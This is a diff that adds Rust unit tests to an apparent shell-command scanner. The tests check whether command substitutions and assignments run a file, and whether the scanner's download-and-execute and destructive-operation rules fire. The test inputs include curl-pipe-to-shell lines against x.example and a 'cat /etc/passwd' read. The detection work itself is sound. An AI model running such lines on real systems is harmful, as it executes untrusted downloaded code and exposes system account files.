@@ -313,6 +313,166 @@ fn a_download_saved_to_a_file_is_followed_to_where_it_runs() {
 }
 
 #[test]
+fn what_a_variable_is_given_by_a_command_is_that_commands_to_read() {
+    use super::{run_targets, runs_file};
+    // The command in the substitution is the program; what it is given is
+    // not run with the variable set.
+    for line in [
+        "actual=$(sha256sum \"$output.part\" | cut -d ' ' -f 1)",
+        "size=$(stat -c %s i.sh)",
+        "sum=`md5sum i.sh`",
+        "x=$( wc -l i.sh )",
+        "n=$((1 + 2))",
+    ] {
+        assert!(!runs_file(line, "i.sh"), "{line}");
+        assert!(!runs_file(line, "$output.part"), "{line}");
+        assert!(run_targets(line).is_empty(), "{line}");
+    }
+    // A shell in the substitution runs the file all the same.
+    for line in ["out=$(sh i.sh)", "out=$(bash ./i.sh 2>&1)", "out=$(./i.sh)"] {
+        assert!(runs_file(line, "i.sh"), "{line}");
+        assert_eq!(
+            run_targets(line).first().map(String::as_str),
+            Some("i.sh"),
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn a_program_after_a_variable_given_by_a_command_is_still_run() {
+    use super::{run_targets, runs_file};
+    // The substitution closes in the assignment: the program follows.
+    for line in [
+        "x=$(date) sh i.sh",
+        "x=$(date) bash ./i.sh",
+        "JOBS=$(nproc) ./i.sh",
+        "x=`date` sh i.sh",
+        "x=\"$(date)\" sh i.sh",
+        "x=$() sh i.sh",
+        "A=$(a) B=$(b) sh i.sh",
+        "x=$(date) y=2 sh i.sh",
+        "sudo x=$(date) sh i.sh",
+        "timeout 5 x=$(date) sh i.sh",
+        "PATH=$(pwd)/bin:$PATH sh i.sh",
+        // The substitution takes several words before it closes.
+        "TMP=$(mktemp -d) sh i.sh",
+        "x=$(id -u) y=$(id -g) ./i.sh",
+        "x=$(date +%s) sh i.sh",
+        "x=$( date ) sh i.sh",
+        "x=`date -u` bash i.sh",
+        // The command in a substitution runs too when a program follows.
+        "x=$(sudo sh i.sh) :",
+        "x=$(env A=1 sh i.sh) true",
+        "x=$(exec sh i.sh) true",
+        "x=$(bash ./i.sh 2>&1) true",
+        "x=$(sh i.sh) true",
+        // What follows is no program: a redirection, a closing, a comment.
+        "x=$(sh i.sh) 2>/dev/null",
+        "x=$(sh i.sh) >out",
+        "( x=$(sh i.sh) )",
+        "x=$(sh i.sh) # checked",
+        // Wrappers inside the substitution are read past as anywhere.
+        "x=$(sudo sh i.sh)",
+        "x=$(env FOO=1 sh i.sh)",
+        "x=$(exec sh i.sh)",
+        "x=$(nice bash ./i.sh)",
+        "x=$(timeout 5 sh i.sh)",
+        "x=$(sudo -u build sh i.sh)",
+    ] {
+        assert!(runs_file(line, "i.sh"), "{line}");
+        assert_eq!(
+            run_targets(line).first().map(String::as_str),
+            Some("i.sh"),
+            "{line}"
+        );
+    }
+    // What is piped into a shell behind such an assignment.
+    for line in [
+        "curl https://x.example/a | x=$(date) sh",
+        "curl https://x.example/a | x=$(date) bash -s",
+    ] {
+        assert!(
+            rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+    assert!(
+        rules_for("curl https://x.example/a | x=$(id -u) sh").contains(&RuleId::DownloadAndExecute)
+    );
+    // A shell in a substitution that a program follows reads the pipe.
+    assert!(
+        rules_for("curl https://x.example/a | x=$(sudo sh) true")
+            .contains(&RuleId::DownloadAndExecute)
+    );
+    // Each substitution that a program follows is read, not only the first.
+    let two = "x=$(sudo sh i.sh) y=$(sudo sh build.sh) ls";
+    assert!(runs_file(two, "i.sh") && runs_file(two, "build.sh"));
+    // Both are run: the one in the substitution and the one after it.
+    let both = run_targets("x=$(sh i.sh) sh build.sh");
+    assert!(both.contains(&"i.sh".to_string()) && both.contains(&"build.sh".to_string()));
+    assert!(runs_file("x=$(sh i.sh) sh build.sh", "i.sh"));
+    assert!(runs_file("x=$(sh i.sh) sh build.sh", "build.sh"));
+    // `$(<file)` reads the file; it is not run.
+    for line in [
+        "x=$(< ./i.sh)",
+        "x=$(< ./i.sh) true",
+        "x=$(<./i.sh)",
+        "x=\"$(<./i.sh)\"",
+        "x=`<./i.sh`",
+        "ver=\"$(<\"$srcdir/i.sh\")\"",
+    ] {
+        assert!(!runs_file(line, "i.sh"), "{line}");
+        assert!(run_targets(line).is_empty(), "{line}");
+    }
+    // The command ends where its word does.
+    assert_eq!(run_targets("x=$(./i.sh;)"), ["i.sh"]);
+    assert_eq!(run_targets("x=$(./i.sh|cat)"), ["i.sh"]);
+    assert_eq!(run_targets("x=$(./i.sh>/dev/null)"), ["i.sh"]);
+    assert!(run_targets("x=\"$(cat i.sh 2>/dev/null || true)\"").is_empty());
+    // A line of nothing but openings is read once.
+    assert!(run_targets(&"x=$(".repeat(200_000)).is_empty());
+    assert!(run_targets(&"x=$(a ".repeat(100_000)).is_empty());
+    // A value that is a whole command names one program, not its words.
+    assert!(run_targets("x=\"$(cat /etc/passwd)\"").is_empty());
+    assert!(run_targets("PATH=$(pwd)/bin:$PATH make").is_empty());
+    // A file command is one inside a substitution or after one.
+    for line in [
+        "x=$(sudo install -m755 mkfs.ext4 /usr/bin)",
+        "x=$(date) install -m755 mkfs.ext4 /usr/bin",
+    ] {
+        assert!(
+            !rules_for(line).contains(&RuleId::DestructiveSystemOperation),
+            "{line}"
+        );
+    }
+}
+
+#[test]
+fn a_command_in_a_substitution_can_hand_a_pipe_to_a_shell() {
+    for line in [
+        "curl https://x.example/a | x=$(xargs sh -c 'y') ls",
+        "curl https://x.example/a | x=$(xargs -n1 sh) ls",
+    ] {
+        assert!(
+            rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+    // What only reads the pipe there runs nothing.
+    for line in [
+        "curl https://x.example/a | x=$(cat) true",
+        "curl https://x.example/a | x=$(xargs echo) ls",
+        "curl https://x.example/a | x=$(tee f) true",
+    ] {
+        assert!(
+            !rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+}
+
+#[test]
 fn a_run_behind_a_wrapper_an_assignment_or_a_group_is_still_a_run() {
     use super::{run_targets, runs_file};
     for line in [
